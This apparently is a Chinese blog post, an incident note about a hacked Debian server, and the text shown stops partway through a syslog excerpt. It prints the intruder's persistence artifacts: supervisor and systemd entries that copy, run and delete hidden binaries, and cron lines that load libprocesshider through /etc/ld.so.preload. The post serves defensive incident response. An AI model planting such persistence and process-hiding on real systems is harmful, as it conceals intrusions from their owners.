@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='上禮拜某天在開會的時候，LINE不斷傳來訊息
+不過因為我向來開會都很認真(驕傲，所以都沒看，接著就變成來電了
+看來大概有啥事發生
+不過畢竟不是正職的工作，就先放著吧
+後來變成連學長都直接打來告訴我，某間公司的伺服器出事了，客戶找不到我
+叫我趕快連進去看
+是說，啊我又沒跟人家簽維護，趕什麼趕&amp;hellip;
+總之，開完會後就了解一下狀況
+'>
+<title>[筆記] Debian Buster 伺服器被入侵了！/ Debian Buster Server Been Hacked</title>
+
+<link rel='canonical' href='https://h.cowbay.org/p/%E7%AD%86%E8%A8%98-debian-buster-%E4%BC%BA%E6%9C%8D%E5%99%A8%E8%A2%AB%E5%85%A5%E4%BE%B5%E4%BA%86/-debian-buster-server-been-hacked/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='[筆記] Debian Buster 伺服器被入侵了！/ Debian Buster Server Been Hacked'>
+<meta property='og:description' content='上禮拜某天在開會的時候，LINE不斷傳來訊息
+不過因為我向來開會都很認真(驕傲，所以都沒看，接著就變成來電了
+看來大概有啥事發生
+不過畢竟不是正職的工作，就先放著吧
+後來變成連學長都直接打來告訴我，某間公司的伺服器出事了，客戶找不到我
+叫我趕快連進去看
+是說，啊我又沒跟人家簽維護，趕什麼趕&amp;hellip;
+總之，開完會後就了解一下狀況
+'>
+<meta property='og:url' content='https://h.cowbay.org/p/%E7%AD%86%E8%A8%98-debian-buster-%E4%BC%BA%E6%9C%8D%E5%99%A8%E8%A2%AB%E5%85%A5%E4%BE%B5%E4%BA%86/-debian-buster-server-been-hacked/'>
+<meta property='og:site_name' content='MCの部落'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='debian' /><meta property='article:published_time' content='2020-07-10T09:48:24&#43;08:00'/><meta property='article:modified_time' content='2020-07-10T09:48:24&#43;08:00'/><meta property='og:image' content='https://h.cowbay.org/images/post-default-14.jpg' />
+<meta name="twitter:title" content="[筆記] Debian Buster 伺服器被入侵了！/ Debian Buster Server Been Hacked">
+<meta name="twitter:description" content="上禮拜某天在開會的時候，LINE不斷傳來訊息
+不過因為我向來開會都很認真(驕傲，所以都沒看，接著就變成來電了
+看來大概有啥事發生
+不過畢竟不是正職的工作，就先放著吧
+後來變成連學長都直接打來告訴我，某間公司的伺服器出事了，客戶找不到我
+叫我趕快連進去看
+是說，啊我又沒跟人家簽維護，趕什麼趕&amp;hellip;
+總之，開完會後就了解一下狀況
+"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://h.cowbay.org/images/post-default-14.jpg' />
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-128770427-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切換選單">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu85bfcf0e08404ecf606702eb99c7ed68_43560_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">MCの部落</a></h1>
+            <h2 class="site-description">讀過兩年書，塵世中一個迷途小書僮</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://www.facebook.com'
+                        target="_blank"
+                        title="facebook"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg height="800px" width="800px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" 
+	 viewBox="0 0 512 512" xml:space="preserve">
+<path style="fill:#385C8E;" d="M134.941,272.691h56.123v231.051c0,4.562,3.696,8.258,8.258,8.258h95.159
+	c4.562,0,8.258-3.696,8.258-8.258V273.78h64.519c4.195,0,7.725-3.148,8.204-7.315l9.799-85.061c0.269-2.34-0.472-4.684-2.038-6.44
+	c-1.567-1.757-3.81-2.763-6.164-2.763h-74.316V118.88c0-16.073,8.654-24.224,25.726-24.224c2.433,0,48.59,0,48.59,0
+	c4.562,0,8.258-3.698,8.258-8.258V8.319c0-4.562-3.696-8.258-8.258-8.258h-66.965C309.622,0.038,308.573,0,307.027,0
+	c-11.619,0-52.006,2.281-83.909,31.63c-35.348,32.524-30.434,71.465-29.26,78.217v62.352h-58.918c-4.562,0-8.258,3.696-8.258,8.258
+	v83.975C126.683,268.993,130.379,272.691,134.941,272.691z"/>
+</svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://h.cowbay.org/" selected>中文</option>
+                        
+                            <option value="https://h.cowbay.org/en/" >English</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>夜晚模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E7%AD%86%E8%A8%98-debian-buster-%E4%BC%BA%E6%9C%8D%E5%99%A8%E8%A2%AB%E5%85%A5%E4%BE%B5%E4%BA%86/-debian-buster-server-been-hacked/">
+                
+                    <img src="https://h.cowbay.org/images/post-default-14.jpg" loading="lazy" alt="Featured image of post [筆記] Debian Buster 伺服器被入侵了！/ Debian Buster Server Been Hacked" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%AD%86%E8%A8%98/" >
+                筆記
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E7%AD%86%E8%A8%98-debian-buster-%E4%BC%BA%E6%9C%8D%E5%99%A8%E8%A2%AB%E5%85%A5%E4%BE%B5%E4%BA%86/-debian-buster-server-been-hacked/">[筆記] Debian Buster 伺服器被入侵了！/ Debian Buster Server Been Hacked</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2020-07-07</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    閱讀時間: 3 分鐘
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>上禮拜某天在開會的時候，LINE不斷傳來訊息</p>
+<p>不過因為我向來開會都很認真(驕傲，所以都沒看，接著就變成來電了</p>
+<p>看來大概有啥事發生</p>
+<p>不過畢竟不是正職的工作，就先放著吧</p>
+<p>後來變成連學長都直接打來告訴我，某間公司的伺服器出事了，客戶找不到我</p>
+<p>叫我趕快連進去看</p>
+<p>是說，啊我又沒跟人家簽維護，趕什麼趕&hellip;</p>
+<p>總之，開完會後就了解一下狀況</p>
+<p>了解狀況後(user 也只說不能連線..WTF)，還是直接連進去看伺服器啥問題好了</p>
+<p>連線的過程就發現，主機回應有點慢</p>
+<p>不過還是可以連上，檢查一下ps / netstat 等等訊息，感覺就是有哪裡怪怪的</p>
+<p>進去etc 看一下，一下 ls -lart 就發現不對，畫面整個跑掉</p>
+<p>感覺就多了很多檔案</p>
+<p>所以先裝個file manager 來看(這樣才能避免ls 被駭客調包的情況)</p>
+<p>總之就發現了一些不正常的檔案</p>
+<p>/etc/.sh 等等族繁不及備載</p>
+<p>於是先去FW 把這台機器對外開放的port 先關掉</p>
+<p>然後開始紀錄邊清</p>
+<p>底下是一些記錄下來的log 很亂，因為是邊清邊紀錄的關係</p>
+<p>這是在某個特定日期時間被產生出來的檔案</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/allow.bak
+</span></span><span class="line"><span class="cl">/etc/deny.bak
+</span></span><span class="line"><span class="cl">/etc/fstab
+</span></span><span class="line"><span class="cl">/etc/sysctl.conf
+</span></span><span class="line"><span class="cl">/etc/gshadow
+</span></span><span class="line"><span class="cl">/etc/fstab.bak
+</span></span><span class="line"><span class="cl">/etc/subuid
+</span></span><span class="line"><span class="cl">/etc/subgid
+</span></span><span class="line"><span class="cl">/etc/.supervisor
+</span></span><span class="line"><span class="cl">/sbin/https
+</span></span><span class="line"><span class="cl">/swapfile
+</span></span><span class="line"><span class="cl">/var/mail/root
+</span></span><span class="line"><span class="cl">/var/lib/rkhunter/tmp/group
+</span></span><span class="line"><span class="cl">/var/lib/rkhunter/tmp/passwd
+</span></span><span class="line"><span class="cl">/var/lib/dpkg/info/python-meld3.list
+</span></span><span class="line"><span class="cl">/var/backups/dpkg.status.1.gz
+</span></span><span class="line"><span class="cl">/var/backups/shadow.bak
+</span></span><span class="line"><span class="cl">/var/backups/group.bak
+</span></span><span class="line"><span class="cl">/var/backups/dpkg.status.6.gz
+</span></span><span class="line"><span class="cl">/var/backups/dpkg.status.3.gz
+</span></span><span class="line"><span class="cl">/var/backups/dpkg.status.5.gz
+</span></span><span class="line"><span class="cl">/var/backups/apt.extended_states.0
+</span></span><span class="line"><span class="cl">/var/backups/dpkg.status.2.gz
+</span></span><span class="line"><span class="cl">/var/backups/passwd.bak
+</span></span><span class="line"><span class="cl">/var/backups/gshadow.bak
+</span></span><span class="line"><span class="cl">/var/backups/dpkg.status.0
+</span></span><span class="line"><span class="cl">/var/backups/dpkg.status.4.gz
+</span></span><span class="line"><span class="cl">/var/log/wtmp.1
+</span></span><span class="line"><span class="cl">/var/log/supervisor
+</span></span><span class="line"><span class="cl">/var/log/dpkg.log.1
+</span></span><span class="line"><span class="cl">/var/log/secure
+</span></span><span class="line"><span class="cl">/var/log/apt/term.log.1.gz
+</span></span><span class="line"><span class="cl">/var/log/apt/history.log.1.gz
+</span></span><span class="line"><span class="cl">/usr/lib/systemd
+</span></span><span class="line"><span class="cl">/usr/lib/mysql/mysql
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>/etc/.supervisor/conf.d/sh.conf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>program:.sh<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">directory</span><span class="o">=</span>/etc/
+</span></span><span class="line"><span class="cl"><span class="nv">command</span><span class="o">=</span>/bin/bash -c <span class="s1">&#39;cp -f -r -- /etc/spts /bin/.sh 2&gt;/dev/null &amp;&amp; /bin/.sh -c  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; rm -rf -- /bin/.sh 2&gt;/dev/null&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">autostart</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="nv">autorestart</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="nv">startretries</span><span class="o">=</span><span class="m">999999999</span>
+</span></span><span class="line"><span class="cl"><span class="nv">redirect_stderr</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="nv">pidfile</span><span class="o">=</span>/etc/psdewo.pid
+</span></span><span class="line"><span class="cl"><span class="nv">stdout_logfile</span><span class="o">=</span>/etc/usercenter_stdout
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>php.sh 這個忘了是在crontab 還是/etc/profile.d/底下看到的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>cp -f -r -- /bin/shh /bin/.sh 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/bin/.sh -c  &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">rm -rf -- .sh 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>supervisor.sh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>supervisord -c /etc/.supervisor/supervisord.conf &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">supervisorctl reload &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>某個 service 檔案</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Unit]
+</span></span><span class="line"><span class="cl">Description=.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Wants=network.target
+</span></span><span class="line"><span class="cl">After=syslog.target network-online.target
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[Service]
+</span></span><span class="line"><span class="cl">Type=forking
+</span></span><span class="line"><span class="cl">ExecStart=/bin/bash -c &#39;cp -f -r -- /bin/.funzip /bin/.sh 2&gt;/dev/null &amp;&amp; /bin/.sh -c  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; rm -rf -- /bin/.sh 2&gt;/dev/null&#39;
+</span></span><span class="line"><span class="cl">Restart=always
+</span></span><span class="line"><span class="cl">KillMode=process
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[Install]
+</span></span><span class="line"><span class="cl">WantedBy=multi-user.target
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>syslog 部份內容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Jul  7 06:20:01 pve CRON[12502]: (root) CMD (/sbin/httpss)
+</span></span><span class="line"><span class="cl">Jul  7 06:20:01 pve CRON[12499]: (root) CMD ( echo /usr/local/lib/libprocesshider.so &gt; /etc/ld.so.preload &amp;&amp; lockr +i /etc/ld.so.preload &gt;/dev/null 2&gt;&amp;1)
+</span></span><span class="line"><span class="cl">Jul  7 06:21:01 pve CRON[14096]: (root) CMD (/usr/lib/mysql/mysql)
+</span></span><span class="line"><span class="cl">Jul  7 06:21:01 pve CRON[14095]: (root) CMD ( echo /usr/local/lib/libprocesshider.so &gt; /etc/ld.so.preload &amp;&amp; lockr +i /etc/ld.so.preload &gt;/dev/null 2&gt;&amp;1)
+</span></span><span class="line"><span class="cl">Jul  7 06:21:01 pve CRON[14094]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2&gt;/dev/null &amp;&amp; /tmp/.sh -c  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; rm -rf -- /tmp/.sh 2&gt;/dev/null)
+</span></span><span class="line"><span class="cl">Jul  7 06:22:01 pve CRON[15995]: (root) CMD ( echo /usr/local/lib/libprocesshider.so &gt; /etc/ld.so.preload &amp;&amp; lockr +i /etc/ld.so.preload &gt;/dev/null 2&gt;&amp;1)
+</span></span><span class="line"><span class="cl">Jul  7 06:22:01 pve CRON[15994]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2&gt;/dev/null &amp;&amp; /tmp/.sh -c  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; rm -rf -- /tmp/.sh 2&gt;/dev/null)
+</span></span><span class="line"><span class="cl">Jul  7 06:22:01 pve CRON[15996]: (root) CMD (/usr/lib/mysql/mysql)
+</span></span><span class="line"><span class="cl">Jul  7 06:23:01 pve CRON[17708]: (root) CMD ( echo /usr/local/lib/libprocesshider.so &gt; /etc/ld.so.preload &amp;&amp; lockr +i /etc/ld.so.preload &gt;/dev/null 2&gt;&amp;1)
+</span></span><span class="line"><span class="cl">Jul  7 06:23:01 pve CRON[17709]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2&gt;/dev/null &amp;&amp; /tmp/.sh -c  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; rm -rf -- /tmp/.sh 2&gt;/dev/null)
+</span></span><span class="line"><span class="cl">Jul  7 06:23:01 pve CRON[17710]: (root) CMD (/usr/lib/mysql/mysql)
+</span></span><span class="line"><span class="cl">Jul  7 06:24:01 pve CRON[19353]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2&gt;/dev/null &amp;&amp; /tmp/.sh -c  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; rm -rf -- /tmp/.sh 2&gt;/dev/null)
+</span></span><span class="line"><span class="cl">Jul  7 06:24:01 pve CRON[19351]: (root) CMD ( echo /usr/local/lib/libprocesshider.so &gt; /etc/ld.so.preload &amp;&amp; lockr +i /etc/ld.so.preload &gt;/dev/null 2&gt;&amp;1)
+</span></span><span class="line"><span class="cl">Jul  7 06:24:01 pve CRON[19352]: (root) CMD (/usr/lib/mysql/mysql)
+</span></span><span class="line"><span class="cl">Jul  7 06:25:01 pve CRON[21289]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2&gt;/dev/null &amp;&amp; /tmp/.sh -c  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; rm -rf -- /tmp/.sh 2&gt;/dev/null)
+</span></span><span class="line"><span class="cl">Jul  7 06:25:01 pve CRON[21290]: (root) CMD (/usr/lib/mysql/mysql)
+</span></span><span class="line"><span class="cl">Jul  7 06:25:01 pve CRON[21288]: (root) CMD (test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily ))
